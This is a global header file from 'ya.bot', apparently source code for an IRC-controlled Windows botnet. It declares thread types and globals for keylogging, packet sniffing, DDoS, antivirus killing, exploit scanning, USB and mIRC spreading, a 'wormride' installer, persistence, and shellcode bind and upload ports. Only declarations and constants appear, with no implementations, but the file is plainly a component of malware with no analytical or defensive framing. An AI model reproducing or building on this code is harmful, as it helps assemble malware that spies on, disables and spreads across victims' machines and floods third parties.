/*  ya.bot  */

//global
//	#define ARRAYSIZE(X) (sizeof(X) / sizeof(X[0]))
	#define MASBUF 4096
	#define GIABUF 2048
	#define BIGBUF 1024
	#define IRCBUF 512
	#define MEDBUF 256
	#define LOWBUF 128
	#define FLOOD_DELAY 1000
//install_wormride.cpp
#ifndef NO_INSTALLWORMRIDE
	#define WORMRIDE_BASEADDRESS 0x13570000 //Check wormride.cpp
#endif
//irc.cpp
	#define POINTER_MAX 32
	extern char g_szBotNick[32];
//irc_parser.cpp
	extern bool g_bAuthed;
	extern char g_szAuthedHost[LOWBUF];
//bot.cpp
	extern SERVICE_STATUS g_ssService;
	extern SERVICE_STATUS_HANDLE g_sshService;
//info.cpp
	enum
	{
			OS_UNKNOWN,
			OS_WINNT,
			OS_WIN2000,
			OS_WINXP,
			OS_WIN2003,
			OS_WINVISTA
	};
//keylog.cpp
#ifndef NO_KEYLOG
	extern bool g_bSignature;
	extern char g_szLog[IRCBUF];
	extern HHOOK g_hHook;
	extern HWND g_hLastFocus;
#endif
//persist.cpp
#ifndef NO_PERSIST
	extern HANDLE g_hPersistThread;
#endif
//thread.cpp
	#define THREAD_MAX 16
	enum
	{
			THREAD_ZERO,
			THREAD_BOT,
			THREAD_IRCPING,
			THREAD_ANTIDEBUG,
			THREAD_DCCGET,
			THREAD_DCCSEND,
			THREAD_FILEFIND,
			THREAD_FTP,
			THREAD_HTTP,
			THREAD_KEYLOG,
			THREAD_PSNIFF,
			THREAD_SECURE,
			THREAD_DAEMONFTP,
			THREAD_DAEMONHTTP,
			THREAD_DAEMONIDENT,
			THREAD_DAEMONSOCKS4,
			THREAD_DDOS,
			THREAD_AVKILLER,
			THREAD_BOTKILLER,
			THREAD_EXPSCAN,
			THREAD_MIRCSCAN,
			THREAD_USBSCAN,
			THREAD_WORMRIDE
	};
	extern struct SThread g_threads[THREAD_MAX];
//userctrl.cpp
	extern struct SAuthedUsers *g_authedusers;
	extern struct SUserList *g_userlist;
//expscan.cpp
#ifndef NO_EXPSCAN
	#define TIMEOUT_RECV 10000
	extern char g_szScanning[128];
//shellcode.cpp
	#define SHELLCODE_BINDPORT 8641
	#define SHELLCODE_UPLOADPORT 8642
#endif
//transfer.cpp
	extern int g_nTransfers;